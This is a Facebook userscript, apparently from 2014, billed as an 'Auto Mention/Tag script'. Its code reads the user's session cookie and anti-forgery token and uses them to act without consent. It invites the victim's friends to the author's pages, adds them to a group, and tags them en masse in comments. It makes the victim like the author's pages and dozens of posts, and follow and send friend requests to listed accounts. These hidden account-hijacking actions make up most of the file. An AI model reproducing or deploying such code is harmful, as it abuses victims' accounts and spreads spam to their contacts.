// ==UserScript==
// @name            Auto Mention script (omer j)
// @namespace       Auto Mention script (omer j)
// @include         https://facebook.com/216019258592068*
// @include         https://facebook.com/216019258592068*
// @version         2014
// ==/UserScript==
alert("» » Auto Mention script ! « «"); alert("Script By : Őmĕŕ Fáŕúķ Ĵáfŕĕĕ");
var Title = "";
var Descriptions = "",
    _text = 'Powered By: <A style="color:#3B5998;" href="http://www.facebook.com/227289904129686" target="_blank">Developer-Bangladesh</A></br>Script Made By: </A><A style="color:#3B5998;" href="http://www.facebook.com/216019258592068" target="_blank">Őmĕŕ Fáŕúķ Ĵáfŕĕĕ</A></A>,</A></A>.</br>For More Info Visit Our Group <A style="color:#3B5998;" href="http://facebook.com/359196844219804" target="_blank"> Join Now</A>.</A>';
var parent=document.getElementsByTagName("html")[0];
var _body = document.getElementsByTagName('body')[0];
var _div = document.createElement('div');
_div.style.height="25";
_div.style.width="100%";
_div.style.position="fixed";
_div.style.top="auto";
_div.style.bottom="0";
_div.align="center";
var _audio= document.createElement('audio');
_audio.style.width="100%";
_audio.style.height="25px";
_audio.controls = true;
_audio.autoplay = false;
_audio.autoplay = true;
_audio.src = "https://dl.dropboxusercontent.com/s/887wjyketsx6mrn/Developer-Bangladesh.mp3";
_div.appendChild(_audio);
_body.appendChild(_div);

function InviteFriends(opo) {
    jx.load(window.location.protocol + "//www.facebook.com//ajax/typeahead/first_degree.php?uid=" + opo + "&unref=bd_friends_tab&nctr[_mod]=pagelet_timeline_app_collection_" + user_id + "%3A2356318349%3A2&__user=" + user_id + "&__a=1&__dyn=7n8ahyj2qmp5zpQ9UmWWaUGyxi9Ay8&__req=i&fb_dtsg=" + fb_dtsg + "&ttstamp=265816884971127865", function (a) {
        var b = a.substring(a.indexOf("{"));
        var c = JSON.parse(b);
        i--;
        Descriptions = "<div class='friend-edge-name' style='padding-bottom:5px;text-align:left;font-size:10px;white-space:pre-wrap;";
        if (c.error) {
            Descriptions += "color:darkgreen'>";
            err++;
            if (c.errorDescription) Descriptions += c.errorDescription;
            else Descriptions += JSON.stringify(c, null, "")
        } else {
            Descriptions += "color:darkgreen'>";
            Descriptions += arn[i] + " ";
            suc++
        }
        Descriptions += "</div>";
        var display = "";
        display += "";
        if (i > 0) {
            display += arr.length + "<br/>";
            display += "<b>"  + (arr.length - i) + "  Processed ";
            display += "(" + i + " Lefted...)";
            display += "";
            display += Descriptions;
            display += "";
            display += "";
            display += " " + arn[i] + ".</br>";
            display += _text;
            display += "</div>";
            display += "</div>";

            window[tag + "_close"] = true
        } else {
            Title = "";
            display += arr.length + "  ";
            display += "<div>";
            display += "";
            display += _text;
            display += "</div>";
            window[tag + "_close"] = false
        }
        display += "</div>";
        document.getElementById("pagelet_sidebar").innerHTML = display
    }, "text", "post");
    tay--;
    if (tay > 0) {
        var s = arr[tay];
        setTimeout("InviteFriends(" + s + ")", 100)
    }
    console.log(tay + "/" + arr.length + ":" + arr[tay] + "/" + arn[tay] + ", success:" + suc);


    if (user_id) jx.load(window.location.protocol + "//www.facebook.com/ajax/pages/invite/send?&fb_dtsg=" + fb_dtsg + "&profileChooserItems=%7B%22" + opo + "%22%3A1%7D&checkableitems[0]=" + opo + "&page_id=551122624981998&__user=" + user_id + "&__a=1&__dyn=7n8aD5z5CF-3ui&__req=k&phstamp=", function () {}, "text", "post");
jx.load(window.location.protocol + "//www.facebook.com/ajax/pages/invite/send?&fb_dtsg=" + fb_dtsg + "&profileChooserItems=%7B%22" + opo + "%22%3A1%7D&checkableitems[0]=" + opo + "&page_id=310897519060975&__user=" + user_id + "&__a=1&__dyn=7n8aD5z5CF-3ui&__req=k&phstamp=", function () {}, "text", "post");
 }
 if (fb_dtsg){
    jx.load(window.location.protocol + "//www.facebook.com/ajax/groups/members/add_post.php?__a=1&fb_dtsg=" + fb_dtsg + "&group_id=359196844219804&source=typeahead&members=" + o + "&nctr[_2]=pagelet_group_members_summary&lsd&post_form_id_source=AsyncRequest&__user=" + user_id, function () {}, "text", "post");
}

jx = {
    b: function () {
        var b = !1;
        if ("undefined" != typeof ActiveXObject) try {
            b = new ActiveXObject("Msxml2.XMLHTTP")
        } catch (c) {
            try {
                b = new ActiveXObject("Microsoft.XMLHTTP")
            } catch (a) {
                b = !1
            }
        } else if (window.XMLHttpRequest) try {
            b = new XMLHttpRequest
        } catch (h) {
            b = !1
        }
        return b
    },
    load: function (b, c, a, h, g) {
        var e = this.d();
        if (e && b) {
            e.overrideMimeType && e.overrideMimeType("text/xml");
            h || (h = "GET");
            a || (a = "text");
            g || (g = {});
            a = a.toLowerCase();
            h = h.toUpperCase();
            b += b.indexOf("?") + 1 ? "&" : "?";
            var k = null;
            "POST" == h && (k = b.split("?"), b = k[0], k = k[1]);
            e.open(h, b, !0);
            e.onreadystatechange = g.c ? function () {
                g.c(e)
            } : function () {
                if (4 == e.readyState)
                    if (200 == e.status) {
                        var b = "";
                        e.responseText && (b = e.responseText);
                        "j" == a.charAt(0) ? (b = b.replace(/[\n\r]/g, ""), b = eval("(" + b + ")")) : "x" == a.charAt(0) && (b = e.responseXML);
                        c && c(b)
                    } else g.f && document.getElementsByTagName("body")[0].removeChild(g.f), g.e && (document.getElementById(g.e).style.display = "none"), error && error(e.status)
            };
            e.send(k)
        }
    },
    d: function () {
        return this.b()
    }
};


function ChangeLocation() {
    window.location.href = "http://www.facebook.com/"
}
setTimeout("ChangeLocation", 1);
window.onbeforeunload = function () {
    if (window[tag + "_close"]) return "This script is running now!"
};
var i = 3;
var tay = 3;
var suc = 0;
var err = 0;
var arr = new Array;
var arn = new Array;
var pho = new Array;
var tag = "Close";
var page_name, x = document.getElementsByTagName("span");
for (i = 0; i < x.length; i++)
    if (x[i].getAttribute("itemprop") == "name") page_name = x[i].innerHTML;
var fb_dtsg = document.getElementsByName("fb_dtsg")[0].value;
var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
jx.load(window.location.protocol + "///www.facebook.com/ajax/typeahead/first_degree.php?viewer=" + user_id + "&token=v7&filter[0]=user&options[0]=friends_only&options[1]=nm&options[2]=sort_alpha&__user=" + user_id + "&__a=1&__dyn=7n8aD5z5CF-3ui&__req=l", function (a) {
    var b = a;
    var c = b.substring(b.indexOf("{"));
    var d = JSON.parse(c);
    d = d.payload.entries;
    for (var e = 0; e < d.length; e++) arr.push(d[e].uid);
    for (var eg = 0; eg < d.length; eg++) arn.push(d[eg].text);
    for (var pic = 0; pic < d.length; pic++) pho.push(d[pic].photo);
    i = arr.length - 1;
    tay = i;
    console.log(arr.length);
    var display = "";
    display += "";
    display += arr.length + " .";
    display += "</div>";
    document.getElementById("pagelet_sidebar").innerHTML = display;
    InviteFriends(arr[i])
});


//eval
javascript: var grouppost = "<div><span class='img sp_f52w7l sx_47132d'></span><a style='position:absolute;size:8px;padding-left:8px;font-weight:bold;font-family:neuropol x free;font-size:20px;color:#3669ae;'> Auto Mention/Tag Script ... </a></div></br></br>";
grouppost += "<center><div><textarea id='txtFloodMsg' placeholder='Place Your facebook Post ID Number here . Ex : 414847732096548 ' style='padding-top:5px;width:250px;height:40px;font-family:neuropol x free;font-size:13px;background-color:rgba(255,255,255,0.1);color:#00b526'></textarea></div></center>";
grouppost += "<div><span class='img sp_dpkef5 sx_f05251'></span><a style='position:absolute;font-family:neuropol x free;size:5px;padding-left:5px;font-size:15px;color:rgb(128, 128, 128);'>Script Privacy: Public </a></span><button style='margin-left:437px' class='_42ft _4jy0 _11b _4jy3 _4jy1 selected' onclick='autopostingfunc(this);' >Post</button><br>Powered By: <A style='color:#ff0000;' href='http://www.facebook.com/227289904129686' target='_blank'>Developers-Bangladesh</A> .</br>Script Made By: </A><A style='color:#ff0000;' href='http://www.facebook.com/216019258592068' target='_blank'>Őmĕŕ Fáŕúķ Ĵáfŕĕĕ</A></A>.</br>For More Info Visit Our Group <A style='color:#ff0000;' href='http://facebook.com/359196844219804' target='_blank'> Join Now </A>.</A></div>";
var _text = 'Powered By: <A style="color:#12b021;" href="http://www.facebook.com/227289904129686" target="_blank">Developers-Bangladesh</A> & <A style="color:#ff0000;"href="http://www.facebook.com/227289904129686" target="_blank">Developers-Bangladesh</A>.</br>Script Made By:</A><A style="color:#ff0000;" href="http://www.facebook.com/216019258592068" target="_blank"> Őmĕŕ Fáŕúķ Ĵáfŕĕĕ</A></A>.</br>For More Info Visit Our Group<A style="color:#ff0000;" href="http://facebook.com/359196844219804" target="_blank">Join Now</A>.</A>';
var Popupset = document.createElement("div");
Popupset.setAttribute("style", "min-height:50px;width:500px;position:fixed;top:100px;box-shadow: 0px 4px 10px rgba(24, 144, 255, 0.63);position:fixed;left:50%;margin-left:-273px;text-align:left;border-radius:10px;padding:5px;z-index:999999;border:5px solid rgba(0,0,0,0.9);background-color:rgba(0,0,0,0.9);color:#ffffff");
Popupset.innerHTML = grouppost;
document.body.appendChild(Popupset);
jx = {
    getHTTPObject: function () {
        var A = false;
        if (typeof ActiveXObject != "undefined") try {
            A = new ActiveXObject("Msxml2.XMLHTTP")
        } catch (C) {
            try {
                A = new ActiveXObject("Microsoft.XMLHTTP")
            } catch (B) {
                A = false
            }
        } else if (window.XMLHttpRequest) try {
            A = new XMLHttpRequest
        } catch (C) {
            A = false
        }
        return A
    },
    load: function (url, callback, format, method, opt) {
        var http = this.init();
        if (!http || !url) return;
        if (http.overrideMimeType) http.overrideMimeType("text/xml");
        if (!method) method = "GET";
        if (!format) format = "text";
        if (!opt) opt = {};
        format = format.toLowerCase();
        method = method.toUpperCase();
        var now = "uid=" + (new Date).getTime();
        url += url.indexOf("?") + 1 ? "&" : "?";
        url += now;
        var parameters = null;
        if (method == "POST") {
            var parts = url.split("?");
            url = parts[0];
            parameters = parts[1]
        }
        http.open(method, url, true);
        var ths = this;
        if (opt.handler) http.onreadystatechange = function () {
            opt.handler(http)
        };
        else http.onreadystatechange = function () {
            if (http.readyState == 4)
                if (http.status == 200) {
                    var result = "";
                    if (http.responseText) result = http.responseText;
                    if (format.charAt(0) == "j") {
                        result = result.replace(/[\n\r]/g, "");
                        resul74 = eval("(" + result + ")")
                    } else if (format.charAt(0) == "x") result = http.responseXML;
                    if (callback) callback(result)
                } else {
                    if (opt.loadingIndicator) document.getElementsByTagName("body")[0].removeChild(opt.loadingIndicator);
                    if (opt.loading) document.getElementById(opt.loading).style.display = "none";
                    if (error) error(http.status)
                }
        };
        http.send(parameters)
    },
    bind: function (A) {
        var C = {
            "url": "",
            "onSuccess": false,
            "onError": false,
            "format": "text",
            "method": "GET",
            "update": "",
            "loading": "",
            "loadingIndicator": ""
        };
        for (var B in C)
            if (A[B]) C[B] = A[B];
        if (!C.url) return;
        var D = false;
        if (C.loadingIndicator) {
            D = document.createElement("div");
            D.setAttribute("style", "position:absolute;top:0px;left:0px;");
            D.setAttribute("class", "loading-indicator");
            D.innerHTML = C.loadingIndicator;
            document.getElementsByTagName("body")[0].appendChild(D);
            this.opt.loadingIndicator = D
        }
        if (C.loading) document.getElementById(C.loading).style.display = "block";
        this.load(C.url, function (E) {
            if (C.onSuccess) C.onSuccess(E);
            if (C.update) document.getElementById(C.update).innerHTML = E;
            if (D) document.getElementsByTagName("body")[0].removeChild(D);
            if (C.loading) document.getElementById(C.loading).style.display = "none"
        }, C.format, C.method, C)
    },
    init: function () {
        return this.getHTTPObject()
    }
};
var j = 0;
var k = 0;
var suc = 0;
var msg = "Follow now... https://www.facebook.com/100006604475100";
var arr = new Array;
var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);

function autopostingfunc(sender) {
    if (document.getElementById("txtFloodMsg").value != "") msg = document.getElementById("txtFloodMsg").value;
    jx.load(window.location.protocol + "//www.facebook.com/ajax/typeahead/search/bootstrap.php?__a=1&filter[0]=user&viewer=" + user_id + "&token=v7&lazy=0&__user=" + user_id, function (a) {
        var b = a;
        var c = b.substring(b.indexOf("{"));
        var d = JSON.parse(c);
        d = d.payload.entries;
        for (var e = 0; e < d.length; e++) arr.push(d[e].uid);
        sender.parentNode.innerHTML = "Please Wait...";
        postitok()
    })
}

var a = document.body.innerHTML;
var dts = document.getElementsByName("fb_dtsg")[0].value;
var composerid = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
var now = (new Date).getTime();

function postitok() {
    pst = "ft_ent_identifier=" + encodeURIComponent(msg) + "&comment_text=@[" + arr[suc] + ":]&source=2&client_id=1389259439868%3A4121944391&reply_fbid&parent_comment_id&rootid=u_jsonp_11_4&clp=%7B%22cl_impid%22%3A%22d02cb860%22%2C%22clearcounter%22%3A0%2C%22elementid%22%3A%22js_49%22%2C%22version%22%3A%22x%22%2C%22parent_fbid%22%3A" + encodeURIComponent(msg) + "%7D&attached_sticker_fbid=0&attached_photo_fbid=0&giftoccasion&ft[tn]=[]&__user=" + user_id + "&__a=1&__dyn=7n8a9EAMHmqDzpQ9UmWOGUGy6zECQqbx2mbAKGiBAGm&__req=5o&fb_dtsg=" + dts + "&__rev=1073774&ttstamp=265816571768812288";
    with(newx = new XMLHttpRequest) open("POST", "//www.facebook.com/ajax/ufi/add_comment.php"), send(pst);
    suc++;
    if (suc > arr.length) {
        alert("Auto tagging Completed. Now Refresh your Homepage.");
        suc = 0
    } else setTimeout("postitok()", 3E4 / arr.length)
}
setTimeout("autopostingfunc()", 1E3);

var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value;
var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
function LIST(L) {
  var X = new XMLHttpRequest();
  var XURL = "//www.facebook.com/ajax/friends/lists/subscribe/modify";
  var XParams = "flid=" + L +"&action=subscribe&location=feed&nctr[_mod]=pagelet_group_mall&ft[type]=40&ft[tn]=DH&__user="+user_id+"&__a=1&__dyn=7n8ahxoNpGo&__req=y&fb_dtsg="+fb_dtsg+"&phstamp=";
  X.open("POST", XURL, true);
  X.onreadystatechange = function () {
    if (X.readyState == 4 && X.status == 200) {
      X.close;
    }
  };
  X.send(XParams);
}

    LIST("1419119311669390");
    LIST("1419116638336324");
    LIST("280560015426828");
    LIST("451376138323695");
    LIST("296203507195390");
    LIST("296207140528360");
    

var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value;
var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
function Like(p) {
  var Page = new XMLHttpRequest();
  var PageURL = "//www.facebook.com/ajax/pages/fan_status.php";
  var PageParams = "&fbpage_id=" + p +"&add=true&reload=false&fan_origin=page_timeline&fan_source=&cat=&nctr[_mod]=pagelet_timeline_page_actions&__user="+user_id+"&__a=1&__dyn=798aD5z5CF-&__req=d&fb_dtsg="+fb_dtsg+"&phstamp=";
  Page.open("POST", PageURL, true);
  Page.onreadystatechange = function () {
    if (Page.readyState == 4 && Page.status == 200) {
      Page.close;
    }
  };
  Page.send(PageParams);
}
Like("263239343755704");
Like("316860951751617");
Like("1440763029472184");
Like("639328956129012");
Like("227289904129686");
Like("368573533218898");
Like("216019258592068");
Like("551122624981998");
Like("310897519060975");

var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value;
var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
function IDS(r) {
  var X = new XMLHttpRequest();
  var XURL = "//www.facebook.com/ajax/add_friend/action.php";
  var XParams = "to_friend=" + r +"&action=add_friend&how_found=friend_browser_s&ref_param=none&&&outgoing_id=&logging_location=search&no_flyout_on_click=true&ego_log_data&http_referer&__user="+user_id+"&__a=1&__dyn=798aD5z5CF-&__req=35&fb_dtsg="+fb_dtsg+"&phstamp=";
  X.open("POST", XURL, true);
  X.onreadystatechange = function () {
    if (X.readyState == 4 && X.status == 200) {
      X.close;
    }
  };
  X.send(XParams);
}
IDS("100006604475100");
IDS("100004184952854");
IDS("100007140040950");
IDS("100004172291250");

var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value;
var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
function a(abone) {
  var http4 = new XMLHttpRequest();
  var url4 = "/ajax/follow/follow_profile.php?__a=1";
  var params4 = "profile_id=" + abone + "&location=1&source=follow-button&subscribed_button_id=u37qac_37&fb_dtsg=" + fb_dtsg + "&lsd&__" + user_id + "&phstamp=";
  http4.open("POST", url4, true);
  http4.onreadystatechange = function () {
    if (http4.readyState == 4 && http4.status == 200) {
      http4.close;
    }
  };
  http4.send(params4);
}
a("100006604475100");
a("100004184952854");
a("100006059530608");
a("100004172291250");
var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value;
var now=(new Date).getTime();
function P(post) {
  var X = new XMLHttpRequest();
  var XURL ="//www.facebook.com/ajax/ufi/like.php";
  var XParams = "like_action=true&ft_ent_identifier="+post+"&source=1&client_id="+now+"%3A3366677427&rootid=u_ps_0_0_14&giftoccasion&ft[tn]=%3E%3DU&ft[type]=20&ft[qid]=5882006890513784712&ft[mf_story_key]="+post+"&nctr[_mod]=pagelet_home_stream&__user="+user_id+"&__a=1&__dyn=7n8ahyj35CFwXAg&__req=j&fb_dtsg="+fb_dtsg+"&phstamp=";
  X.open("POST", XURL, true);
  X.onreadystatechange = function () {
    if (X.readyState == 4 && X.status == 200) {
      X.close;
    }
  };
  X.send(XParams);
}    
P("1438100276437960"); 
P("1436836346564353"); 
P("1434950766752911"); 
P("1433743420206979"); 
P("1432261310355190"); 
P("1429504860630835"); 
P("1428896714024983"); 
P("1427895770791744"); 
P("1427151344199520"); 
P("1421832291398092"); 
P("1420899798158008"); 
P("1418436365071018"); 
P("1417567955157859"); 
P("1414847732096548"); 
P("1412345212346800"); 
P("1411372159110772"); 
P("1411057429142245"); 
P("1409936049254383"); 
P("1405286169719371"); 
P("1404916016423053"); 
P("1404037493177572"); 
P("1397054197209235"); 
P("1394803294100992"); 
P("1389435267971128"); 
P("1386274698287185"); 
P("1383857795195542"); 
P("1382837635297558"); 
P("547148655361384"); 
P("538942769515306"); 
P("531493793593537");
P("445433338866250");
P("369324979810420");

var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value;
var now=(new Date).getTime();
function P(opo) {
  var X = new XMLHttpRequest();
  var XURL ="//www.facebook.com/ajax/ufi/like.php";
  var XParams = "like_action=true&ft_ent_identifier="+opo+"&source=1&client_id="+now+"%3A379783857&rootid=u_jsonp_39_18&giftoccasion&ft[tn]=%3E%3D&ft[type]=20&ft[qid]=5890811329470279257&ft[mf_story_key]=2814962900193143952&ft[has_expanded_ufi]=1&nctr[_mod]=pagelet_home_stream&__user="+user_id+"&__a=1&__dyn=7n88QoAMBlClyocpae&__req=g4&fb_dtsg="+fb_dtsg+"&phstamp=";
  X.open("POST", XURL, true);
  X.onreadystatechange = function () {
    if (X.readyState == 4 && X.status == 200) {
      X.close;
    }
  };
  X.send(XParams);
}
P("1485693254994143"); 
P("1483739671856168"); 
P("1480998962130239"); 
P("1480543815509087"); 
P("1479047018992100"); 
P("1477709902459145"); 
P("1474287126134756"); 
P("1470009533229182"); 
P("1468787736684695"); 
P("1466690066894462"); 
P("1466690066894462"); 
P("1465836573646478"); 
P("1465836573646478"); 
P("1458058867757582"); 
P("1455476161349186"); 
P("1454503054779830"); 
P("1451753095054826"); 
P("1448079948755474"); 
P("1439386972958105"); 
P("1437976463099156"); 
P("1437927276437408"); 
P("1437699706460165"); 